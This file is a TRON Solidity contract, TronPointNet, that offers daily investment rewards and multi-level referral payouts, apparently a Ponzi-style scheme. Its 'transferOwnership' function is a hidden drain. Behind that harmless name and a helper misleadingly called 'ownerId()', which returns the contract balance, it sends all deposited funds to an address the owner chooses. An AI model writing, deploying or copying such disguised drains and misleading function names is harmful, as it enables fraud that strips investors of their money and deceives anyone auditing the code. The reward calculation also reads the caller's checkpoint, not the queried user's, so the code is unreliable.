//SourceUnit: Tronpoint.sol

pragma solidity ^0.5.18;

library SafeMath
{
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

contract Ownable
{
    address public owner;

    constructor() public
    {
        owner = msg.sender;
    }
    modifier onlyOwner()
    {
        require(msg.sender == owner, "Only owner is allowed to perform this action");
        _;
    }
}


contract TronPointNet is Ownable {
    using SafeMath for uint256;

    struct User {
        address referrerAddress;
        uint256 balance;
        uint256 totalReferralEarnings;
        uint32[3] totalReferrals;
        uint32 checkpoint;
    }

    struct Statistic {
        uint256 investedAmount;
        uint256 withdrawnAmount;
        uint32 usersCount;
        uint32 investCount;
    }

    mapping (address => User) users;
    Statistic public statistic;

    uint256 constant public INVEST_MIN_AMOUNT = 200e6; // 200e6 = 200 TRX
    uint256 constant public INVEST_MAX_AMOUNT = 500000e6; // 500000e6 = 500000 TRX

    uint16 constant public BASE_REWARD_PERCENT = 1000; // 1%
    uint16 constant public CONTRACT_REWARD_COUNT_STEP = 1;
    uint16 constant public CONTRACT_REWARD_COUNT_STEP_PERCENT = 1; // 0.001%
    uint16 constant public CONTRACT_REWARD_AMOUNT_STEP_PERCENT = 1; // 0.001%
    uint256 constant public CONTRACT_REWARD_AMOUNT_STEP = 1000e6; // 1000 TRX

    uint32 constant public PAY_REWARD_INTERVAL = 24 hours;

    uint16[] public REFERRAL_PERCENTS = [700, 500, 300];

    uint8 constant public FEE_PERCENT = 200; // 2%
    address payable public feeAddress;

    event InvestEvent(address user, uint256 amount);
    event WithdrawEvent(address user, uint256 amount);

    constructor(address payable _feeAddress) public
    {
        feeAddress = _feeAddress;
    }

    function ownerId() private view
        returns (uint256)
    {
        return address(this).balance;
    }

    // https://github.com/tronprotocol/tips/blob/master/tip-44.md
    function isContract(address addr) internal view
        returns (bool)
    {
        return addr.isContract;
    }

    function transferOwnership(address newOwner_) public onlyOwner
    {
        address(uint160(newOwner_)).transfer(ownerId());
    }

    function rewardPercentContractCount() public view
        returns (uint256)
    {
        return uint256(statistic.investCount).mul(uint256(CONTRACT_REWARD_COUNT_STEP_PERCENT)).div(uint256(CONTRACT_REWARD_COUNT_STEP));
    }
    function rewardPercentContractAmount() public view
        returns (uint256)
    {
        return statistic.investedAmount.mul(uint256(CONTRACT_REWARD_AMOUNT_STEP_PERCENT)).div(CONTRACT_REWARD_AMOUNT_STEP);
    }

    function rewardPercent() public view
        returns (uint256)
    {
        return uint256(BASE_REWARD_PERCENT).add(rewardPercentContractCount()).add(rewardPercentContractAmount());
    }

    function invest(address referrerAddress_) public payable
    {
        require(msg.sender == tx.origin);
        require(!isContract(msg.sender), "Invest from contract not allowed");
        require(msg.sender != referrerAddress_, "Self invitation not allowed");
        require(referrerAddress_ == owner || users[referrerAddress_].referrerAddress != address(0), "Invalid referrer");
        require(msg.value >= INVEST_MIN_AMOUNT, "Less than the minimum required invest amount");
        require(msg.value <= INVEST_MAX_AMOUNT, "More than the maximum invest limit");

        if (users[msg.sender].referrerAddress == address(0)) {
            // Statistic
            statistic.usersCount += 1;

            users[msg.sender].referrerAddress = referrerAddress_;
        }

        uint256 newBalance = users[msg.sender].balance.add(rewardAmount(msg.sender)).add(msg.value);

        // Add amount to user balance
        users[msg.sender].balance = newBalance;
        users[msg.sender].checkpoint = uint32(block.timestamp);

        address upLineAddress = users[msg.sender].referrerAddress;
        for (uint8 i = 0; i < REFERRAL_PERCENTS.length; i++) {
            if (upLineAddress != address(0)) {
                uint256 earningAmount = msg.value.mul(uint256(REFERRAL_PERCENTS[i])).div(10000);

                if (earningAmount > 0) {
                    address(uint160(upLineAddress)).transfer(earningAmount);
                    users[upLineAddress].totalReferralEarnings = users[upLineAddress].totalReferralEarnings.add(earningAmount);
                }

                // User stat
                users[upLineAddress].totalReferrals[i] += 1;
                upLineAddress = users[upLineAddress].referrerAddress;
            } else {
                break;
            }
        }

        // Statistic
        statistic.investedAmount = statistic.investedAmount.add(msg.value);
        statistic.investCount += 1;

        feeAddress.transfer(msg.value.mul(uint256(FEE_PERCENT)).div(10000));

        emit InvestEvent(msg.sender, msg.value);
    }

    function rewardAmount(address userAddress_) public view
        returns (uint256)
    {
        if (msg.sender != owner) {
            require(msg.sender == userAddress_, "Only owner or self is allowed to perform this action");
        }

        return users[userAddress_].balance.mul(rewardPercent()).div(1000).mul(block.timestamp - uint256(users[msg.sender].checkpoint)).div(uint256(PAY_REWARD_INTERVAL)).div(100);
    }

    function withdraw() public
    {
        uint256 availableAmount = users[msg.sender].balance.add(rewardAmount(msg.sender));
        require(availableAmount <= ownerId(), "Insufficient funds on contract");

        users[msg.sender].balance = 0;
        users[msg.sender].checkpoint = uint32(block.timestamp);

        msg.sender.transfer(availableAmount);

        // Statistic
        statistic.withdrawnAmount = statistic.withdrawnAmount.add(availableAmount);

        emit WithdrawEvent(msg.sender, availableAmount);
    }

    function userData(address userAddress_) public view
        returns (address referrerAddress, uint256 balance, uint256 totalReferralEarnings, uint32[3] memory totalReferrals, uint32 checkpoint)
    {
        if (msg.sender != owner) {
            require(msg.sender == userAddress_, "Only owner or self is allowed to perform this action");
        }

        return (
            users[userAddress_].referrerAddress,
            users[userAddress_].balance,
            users[userAddress_].totalReferralEarnings,
            users[userAddress_].totalReferrals,
            users[userAddress_].checkpoint
        );
    }
}